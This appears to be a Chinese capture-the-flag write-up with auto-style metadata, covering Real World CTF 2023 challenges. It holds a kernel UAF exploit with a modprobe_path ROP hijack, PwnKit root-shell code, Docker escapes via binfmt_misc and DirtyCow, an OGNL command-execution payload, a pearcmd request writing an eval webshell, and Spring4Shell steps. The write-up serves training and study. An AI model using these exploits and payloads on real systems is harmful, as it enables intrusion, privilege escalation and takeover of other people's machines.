---
title: 第五届 Real World CTF 体验赛 Writeup
contest: RealWorldCTF
year: 2023
difficulty: hard
vuln_type: misc_unknown
tags: [Linux-Kernel-5.19, UAF, race-condition, modprobe_path, keyctl-syscall, PwnKit-CVE-2021-4034, pkexec, DirtyCow-vDSO, binfmt_misc, docker-escape, OGNL-RCE, Spring4Shell, vm2-sandbox-escape, pearcmd]
attack_chain:
  - Pwn Digging-into-Kernel-3: Linux 5.19.0 + /dev/rwctf 漏洞驱动 (UAF+race+leak)
  - keyring keyctl syscall 喷射 user_key_payload, key_revoke/key_unlink 释放
  - add(0, 0x100) + delete(0) + 50 user_key spray + double free 触发内核堆块复用
  - key_read 泄 heap (0xe8) + user_free_payload_rcu (0xf0) → vmlinux 基址
  - 提权: 改 modprobe_path = /tmp/x, /tmp/dummy 触发 modprobe → chmod 777 /flag
  - 二次利用: hijack /proc/self/stat seq_operations + ROP 调用 read + 写 modprobe_path
  - LPE PwnKit: GCONV_PATH=. + pwnkit.so gconv_init() setuid(0) + system("/bin/sh")
  - Docker Escaper-2: binfmt_misc 注册 + sshd motd 触发 host 命令
  - Docker Escaper-3: DirtyCow vDSO patch 触发 COW
  - BUS Driver: busctl --system call org.dbus.rwctf SayBoss s /tmp/exp.sh
  - Web Wiki-Hacker: OGNL RCE @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id"))
  - Web ApacheCommandText: ${base64decoder:JHtzY3JpcHQ6...}
  - Web Langurage-Expert: pearcmd.php register_argc_argv + config-create + <?=@eval($_POST[a]);?> 写 /tmp/1.php
  - Web Yummy Api: Mongodb 注入 + aes192 token 解密 + pre-script 上传 vm2 逃逸脚本
  - Web Spring4Shell: class.module.classLoader.resources.context.parent.pipeline.first.pattern + .directory + .prefix + .suffix + .appBase=/
key_payload: 'modprobe_path hijack + pop_rax_ret + ret + gconv_init setuid(0) + GCONV_PATH=.'
one_liner: 第五届 RWCTF 体验赛多方向：内核 modprobe_path hijack + PwnKit 提权 + Docker binfmt 逃逸 + OGNL RCE + Spring4Shell。
lesson: 内核 modprobe_path 持久提权是现代 Linux LPE 经典套路；PwnKit CVE-2021-4034 影响所有 polkit 版本；Spring4Shell class.module.classLoader pipeline 改写 appBase 绕过路径限制。
quality: high
---

# 第五届 Real World CTF 体验赛 Writeup（全部题目）

**来源**: ctfiot.com ID 91583

## Pwn

### Digging into Kernel 3（Linux 5.19.0）
漏洞驱动 `/dev/rwctf` 含 UAF + race condition + memory leak

**利用 1: 堆块复用泄地址**
```c
add(0, 0x100, cont);  delete(0);  // 释放
key_spray(keys, 50, "y" * SPRAY_USER_KEY_SIZE, "spray_key", ...);  // 50 个 user_key 占用
delete(0);  // double free
add(1, 0x100, cont);  // 占位
key_read(keys[i], recv, 0x2000);  // 读越界泄
// 0xe8: heap, 0xf0: user_free_payload_rcu, 0x100: needle
g_vmlinux = user_free_payload_rcu - 0x339d8210;
g_modprobe_path = g_vmlinux + 0x34e510a0;
```

**利用 2: modprobe_path hijack**
```c
pop_rax_ret = g_vmlinux + 0x33600ddb;  // pop rax; ret
mov_ptr_rax_rdi_ret = g_vmlinux + 0x337b614a;  // mov [rax], rdi; ret
// ROP: pop rax=modprobe_path; pop rdi="/tmp/x\x00"; mov [rax], rdi
// 然后 /tmp/dummy (0xffffff 头) 触发 modprobe → chmod 777 /flag
```

**利用 3: /proc/self/stat hijack**
- seq_operations 0x00-0x18 8 字节函数指针
- ROP 调 read(seq_fd, fake_seq_operations, 1) 写入 gadget 地址
- 第二次 read 触发 gadget 链

### Be-a-PK-LPE-Master（PwnKit CVE-2021-4034）
```c
// gconv-modules 引入 pwnkit.so
// gconv_init() 调 setuid(0); setgid(0); system("/bin/sh")
char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
execve("/usr/bin/pkexec", (char*[]){NULL}, env);
```

### Be-a-Docker-Escaper-2（binfmt_misc）
```bash
echo ":test:M::\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register
echo '#!/bin/bash' > /tmp/exploit
echo "docker cp /root/flag $container:/tmp/" >> /tmp/exploit
chmod 777 /tmp/exploit
```
ssh 连接触发 /etc/update-motd.d/00-header → exploit 在 host 执行

### Be-a-Docker-Escaper-3（DirtyCow vDSO）
```bash
pip install pyelftools
git clone https://github.com/zh-explorer/dirtycow.git
cmake .. && make
./dirtycow {IP} 31337
```

### Be-a-BUS-Driver
```bash
busctl --system call org.dbus.rwctf /org/dbus/rwctf org.dbus.rwctf1 SayBoss s "/tmp/exp.sh"
```

## Web

### Be-a-Wiki-Hacker（OGNL RCE）
```
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

### Evil MySQL Server
```
${base64decoder:JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7...}
```

### Be-a-Langurage-Expert（pearcmd.php）
```
GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php
```

### Yummy Api（vm2 sandbox escape）
- Mongodb 注入爆破用户 token
- aes192 token 解密 → 调用项目任意功能
- pre-script 上传 vm2 逃逸脚本

### Spring4Shell
```bash
python git_extract.py http://ip:port/.git/  # 提取源码
# 解题思路 1: python exploit.py --url http://ip:port/ --dir chaitin/ROOT
# 解题思路 2: 改 appBase=/ 写 /tmp/shell.jsp
```

## 评价
Real World CTF 体验赛覆盖内核/容器逃逸/Web RCE/反序列化全栈。5 大子领域：Kernel LPE、Linux LPE、Docker 逃逸、OGNL/Java 反序列化、PHP pearcmd/Spring4Shell。是顶级综合实战训练场。
